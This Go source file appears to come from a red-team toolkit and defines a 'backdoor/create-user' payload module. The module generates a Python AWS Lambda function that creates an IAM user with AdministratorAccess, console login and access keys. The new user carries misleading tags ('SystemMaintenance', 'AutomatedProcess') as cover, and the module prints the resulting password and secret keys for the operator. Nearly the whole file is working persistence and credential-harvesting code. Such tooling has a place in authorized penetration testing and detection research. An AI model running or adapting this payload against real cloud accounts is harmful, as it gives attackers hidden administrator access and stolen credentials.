// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type BackdoorCreateUserPayload struct{}

func NewBackdoorCreateUserPayload() *BackdoorCreateUserPayload {
	return &BackdoorCreateUserPayload{}
}

func init() {
	payloads.Register(NewBackdoorCreateUserPayload())
}

func (p *BackdoorCreateUserPayload) GetName() string {
	return "backdoor/create-user"
}

func (p *BackdoorCreateUserPayload) GetDescription() string {
	return "Create an IAM user with administrator privileges and console access"
}

func (p *BackdoorCreateUserPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
		payloads.TagTransportResponse,
	}
}

func (p *BackdoorCreateUserPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "USER_NAME",
			Description: "Name for the backdoor user",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "CONSOLE_ACCESS",
			Description: "Enable console password for the user",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "ACCESS_KEY",
			Description: "Create programmatic access keys",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "USER_PATH",
			Description: "IAM path for the user",
			Required:    false,
			Default:     "/",
		},
	}
}

func (p *BackdoorCreateUserPayload) GenerateCode(options map[string]string) (string, error) {
	userName := options["USER_NAME"]
	consoleAccess := options["CONSOLE_ACCESS"] != "false" // default true
	accessKey := options["ACCESS_KEY"] != "false"         // default true
	userPath := options["USER_PATH"]
	if userPath == "" {
		userPath = "/"
	}

	userNameCode := ""
	if userName != "" {
		userNameCode = "'" + userName + "'"
	} else {
		userNameCode = "f'pathrunner-admin-{int(time.time())}'"
	}

	consoleCode := ""
	if consoleAccess {
		consoleCode = `
        # Generate a random password
        password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%^&*', k=16))

        # Set login profile for console access
        iam_client.create_login_profile(
            UserName=user_name,
            Password=password,
            PasswordResetRequired=False
        )

        result['console_password'] = password
        result['console_url'] = f'https://{account_id}.signin.aws.amazon.com/console'`
	}

	accessKeyCode := ""
	if accessKey {
		accessKeyCode = `
        # Create access keys
        access_key_response = iam_client.create_access_key(UserName=user_name)
        access_key = access_key_response['AccessKey']

        result['access_key_id'] = access_key['AccessKeyId']
        result['secret_access_key'] = access_key['SecretAccessKey']`
	}

	code := `import json
import boto3
import time
import random
import string

def lambda_handler(event, context):
    result = {
        'message': 'Pathrunner backdoor user creation',
        'timestamp': context.aws_request_id,
        'status': 'started'
    }

    try:
        iam_client = boto3.client('iam')
        sts_client = boto3.client('sts')

        # Get current account ID
        caller_identity = sts_client.get_caller_identity()
        account_id = caller_identity['Account']

        # Generate user name if not specified
        user_name = ` + userNameCode + `

        # Administrator access policy
        admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

        # Create the backdoor user
        user_response = iam_client.create_user(
            UserName=user_name,
            Path='` + userPath + `',
            Tags=[
                {
                    'Key': 'Purpose',
                    'Value': 'SystemMaintenance'
                },
                {
                    'Key': 'CreatedBy',
                    'Value': 'AutomatedProcess'
                }
            ]
        )

        result['user_arn'] = user_response['User']['Arn']
        result['user_name'] = user_name
        result['account_id'] = account_id

        # Attach administrator policy
        iam_client.attach_user_policy(
            UserName=user_name,
            PolicyArn=admin_policy_arn
        )` + consoleCode + accessKeyCode + `

        result['status'] = 'success'
        result['message'] = 'Backdoor user created successfully with administrator privileges'

    except iam_client.exceptions.EntityAlreadyExistsException:
        result['status'] = 'error'
        result['message'] = f'User {user_name} already exists'
    except Exception as e:
        result['status'] = 'error'
        result['message'] = f'Failed to create backdoor user: {str(e)}'

    return {
        'statusCode': 200,
        'body': json.dumps(result, indent=2)
    }
`

	return code, nil
}

func (p *BackdoorCreateUserPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Backdoor User Creation Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("✓ Backdoor user created successfully!\n\n")

			if userArn, ok := parsedBody["user_arn"].(string); ok {
				output.WriteString("User ARN: " + userArn + "\n")
			}

			if userName, ok := parsedBody["user_name"].(string); ok {
				output.WriteString("User Name: " + userName + "\n")
			}

			if accountID, ok := parsedBody["account_id"].(string); ok {
				output.WriteString("Account ID: " + accountID + "\n")
			}

			output.WriteString("\nAccess Methods:\n")

			if consolePassword, ok := parsedBody["console_password"].(string); ok {
				output.WriteString("Console Access:\n")
				if consoleURL, ok := parsedBody["console_url"].(string); ok {
					output.WriteString("  URL: " + consoleURL + "\n")
				}
				if userName, ok := parsedBody["user_name"].(string); ok {
					output.WriteString("  Username: " + userName + "\n")
				}
				output.WriteString("  Password: " + consolePassword + "\n\n")
			}

			if accessKeyID, ok := parsedBody["access_key_id"].(string); ok {
				secretKey, _ := parsedBody["secret_access_key"].(string)
				userName, _ := parsedBody["user_name"].(string)
				identityName := "backdoor/" + userName
				if userName == "" {
					identityName = "backdoor/lambda-user"
				}
				output.WriteString("\n--- PATHFINDER_IDENTITY_DATA ---\n")
				output.WriteString("NAME=" + identityName + "\n")
				output.WriteString("TYPE=keys\n")
				output.WriteString("ACCESS_KEY_ID=" + accessKeyID + "\n")
				output.WriteString("SECRET_ACCESS_KEY=" + secretKey + "\n")
				output.WriteString("AUTO_SWITCH=false\n")
				output.WriteString("--- END_PATHFINDER_IDENTITY_DATA ---\n")
			}

		} else {
			output.WriteString("✗ Failed to create backdoor user\n")
			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	if timestamp, ok := parsedBody["timestamp"].(string); ok {
		output.WriteString("\nRequest ID: " + timestamp + "\n")
	}

	return output.String(), nil
}

func (p *BackdoorCreateUserPayload) Validate(options map[string]string) error {
	// No required options for this payload
	return nil
}
